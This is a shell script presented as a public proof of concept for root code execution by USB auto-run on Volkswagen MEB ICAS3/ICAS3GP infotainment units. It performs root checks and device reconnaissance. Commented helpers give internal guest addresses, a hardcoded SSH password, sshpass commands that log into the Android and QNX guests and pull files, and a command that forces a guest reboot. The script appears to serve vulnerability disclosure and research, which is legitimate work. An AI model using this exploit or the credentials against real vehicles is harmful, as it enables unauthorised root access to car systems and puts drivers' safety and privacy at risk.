#!/bin/sh
#
# =============================================================================
#  lg.sh — VW MEB ICAS3 / ICAS3GP USB auto-execution PoC
# =============================================================================
#
#  Copyright (c) Saif Alzyoud / ZTECJO
#  Author  : Saif Alzyoud
#  Web     : https://www.ztecjo.com
#            https://www.alzyoud.org
#
#  Found   : early 2022
#  Tested  : ICAS3 (2022–2023), ICAS3GP (late 2023 – early 2024)
#
#  The IVI stack invokes this file as root on USB insert via RunAutoHmiUpdate:
#    /tmp/USB/PORT1/PART1/lg.sh
#
#  All rights reserved.
# =============================================================================

set -u

USB_ROOT="/tmp/USB/PORT1/PART1"
MARKER_START="${USB_ROOT}/script.started"
MARKER_ROOT="${USB_ROOT}/rooted"
MARKER_USER="${USB_ROOT}/not.root"
MARKER_DONE="${USB_ROOT}/script.finished"
DEV_DUMP="${USB_ROOT}/result_before.txt"
LOG_FILE="${USB_ROOT}/lg_poc.log"

log() {
    # Append a timestamped line to the USB log (best-effort).
    _msg="$1"
    _ts="$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo unknown)"
    echo "[${_ts}] ${_msg}" >> "${LOG_FILE}" 2>/dev/null || true
}

write_marker() {
    _path="$1"
    _body="$2"
    echo "${_body}" > "${_path}" 2>/dev/null || true
}

# -----------------------------------------------------------------------------
# Entry
# -----------------------------------------------------------------------------

write_marker "${MARKER_START}" "Alzyoud / ZTECJO — lg.sh started"
log "PoC started (pid=$$)"

# Privilege check — scripts are expected to run as root via RunAutoHmiUpdate.
if [ "$(id -u 2>/dev/null || echo 1)" -ne 0 ]; then
    write_marker "${MARKER_USER}" "FAIL: not running as root"
    log "Not root — aborting recon"
else
    write_marker "${MARKER_ROOT}" "OK: running as root (uid=0)"
    log "Confirmed root (uid=0)"
fi

# -----------------------------------------------------------------------------
# Lightweight recon (safe defaults for public PoC)
# -----------------------------------------------------------------------------

# Device node inventory → written back to the USB stick.
if ls -laR /dev/ > "${DEV_DUMP}" 2>/dev/null; then
    log "Wrote device listing to result_before.txt"
else
    log "WARN: failed to dump /dev"
fi

# Optional: block devices / mounts (uncomment if needed on target).
# lsblk -o NAME,MOUNTPOINT,LABEL,SIZE,UUID > "${USB_ROOT}/lsblk.txt" 2>/dev/null

# -----------------------------------------------------------------------------
# Optional research helpers (disabled by default)
# -----------------------------------------------------------------------------
#
# Internal guest map (reference):
#   ANDROID  fd53:7cb8:383:3::99
#   AGL      fd53:7cb8:383:3::108
#   QNX      fd53:7cb8:383:3::73
#
# Engineering popup (stock):
#   /usr/bin/run_engineering-popup.sh MERCURY
#
# Show PNG from USB:
#   /lge/app_ro/bin/pngviewer.sh "${USB_ROOT}/1.png"
#
# AGL reboot via inject_cmd:
#   echo sysreboot > /sys/devices/platform/10900000.spi/spi_master/spi6/spi6.0/inject_cmd
#
# Guest SSH (hardcoded credentials observed on target):
#   sshpass -p 'Rkdckd1023ghdWl2020Qkrtjdakstp' ssh -q -o StrictHostKeyChecking=no \
#       fd53:7cb8:383:3::73 "cat /etc/ssplash_cmd.sh" > "${USB_ROOT}/test.sh"
#   sshpass -p 'Rkdckd1023ghdWl2020Qkrtjdakstp' ssh -q -o StrictHostKeyChecking=no \
#       fd53:7cb8:383:3::99 "ls /" > "${USB_ROOT}/compatibility_matrix.xml"
#   sshpass -p 'Rkdckd1023ghdWl2020Qkrtjdakstp' ssh -q -o StrictHostKeyChecking=no \
#       192.168.0.2
#

# -----------------------------------------------------------------------------
# Exit
# -----------------------------------------------------------------------------

write_marker "${MARKER_DONE}" "Alzyoud / ZTECJO — lg.sh finished"
log "PoC finished"
sync

exit 0
